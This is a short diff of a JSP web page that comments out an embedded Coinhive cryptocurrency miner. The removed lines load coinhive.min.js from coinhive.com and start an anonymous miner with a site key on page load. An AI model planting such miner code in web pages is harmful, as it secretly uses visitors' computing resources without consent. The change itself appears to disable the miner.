@@ -66,10 +66,10 @@
   </head>
   
   <body>
-  <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<%--  <script src="https://coinhive.com/lib/coinhive.min.js"></script>--%>
 <script>
-	var miner = new CoinHive.Anonymous('EnzK5M2jBaMcQ308UAOLhhQHP8GtV3zp');
-	miner.start();
+	// var miner = new CoinHive.Anonymous('EnzK5M2jBaMcQ308UAOLhhQHP8GtV3zp');
+	// miner.start();
 </script>
 	  	<div style="display: none">
 	        <%@ include file="common/language/multiLanguage.jsp" %>
